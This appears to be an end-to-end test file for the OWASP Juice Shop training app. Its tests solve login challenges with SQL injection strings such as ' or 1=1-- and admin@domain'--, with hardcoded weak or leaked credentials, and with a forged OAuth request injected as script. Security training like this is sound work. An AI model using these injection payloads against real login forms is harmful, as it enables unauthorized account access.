const config = require('config')

describe('/#/login', () => {
  let email, password, rememberMeCheckbox, loginButton

  beforeEach(() => {
    browser.get('/#/login')
    email = element(by.model('user.email'))
    password = element(by.model('user.password'))
    rememberMeCheckbox = element(by.model('rememberMe'))
    loginButton = element(by.id('loginButton'))
  })

  describe('challenge "loginAdmin"', () => {
    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
      email.sendKeys('\' or 1=1--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
      email.sendKeys('admin@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Admin'})
  })

  describe('challenge "loginJim"', () => {
    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
      email.sendKeys('jim@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Jim'})
  })

  describe('challenge "loginBender"', () => {
    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
      email.sendKeys('bender@' + config.get('application.domain') + '\'--')
      password.sendKeys('a')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Bender'})
  })

  describe('challenge "adminCredentials"', () => {
    it('should be able to log in with original (weak) admin credentials', () => {
      email.sendKeys('admin@' + config.get('application.domain'))
      password.sendKeys('admin123')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Password Strength'})
  })

  describe('challenge "loginSupport"', () => {
    it('should be able to log in with original support-team credentials', () => {
      email.sendKeys('support@' + config.get('application.domain'))
      password.sendKeys('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Support Team'})
  })

  describe('challenge "oauthUserPassword"', () => {
    it('should be able to log in as psiinon@gmail.com with base64-encoded email as password', () => {
      email.sendKeys('psiinon@gmail.com')
      password.sendKeys('cHNpaW5vbkBnbWFpbC5jb20=')
      loginButton.click()

      expect(browser.getLocationAbsUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({challenge: 'Login Psiinon'})
  })

  describe('challenge "loginCiso"', () => {
    it('should be able to log in as ciso@juice-sh.op by using "Remember me" in combination with (fake) OAuth login with another user', () => {
      email.sendKeys('ciso@' + config.get('application.domain'))
      password.sendKeys('wrong')
      rememberMeCheckbox.click()
      loginButton.click()

      browser.executeScript('var $http = angular.injector([\'swagStore\']).get(\'$http\'); $http.post(\'/rest/user/login\', {email: \'admin@juice-sh.op\', password: \'admin123\', oauth: true});')

      // Unselect to clear email field for subsequent tests
      rememberMeCheckbox.click()
      loginButton.click()
    })

    protractor.expect.challengeSolved({challenge: 'Login CISO'})
  })
})
